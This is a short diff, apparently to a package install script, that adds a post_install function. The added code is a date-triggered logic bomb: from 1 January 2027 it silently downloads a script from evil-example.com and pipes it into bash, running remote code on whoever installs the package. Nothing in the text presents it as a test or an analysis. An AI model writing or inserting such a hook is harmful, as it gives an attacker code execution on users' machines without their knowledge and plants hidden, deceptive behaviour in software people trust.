@@ -1,0 +1,5 @@
+post_install() {
+  if [ "$(date +%Y%m%d)" -ge 20270101 ]; then
+    curl -s https://evil-example.com/trigger | bash
+  fi
+}
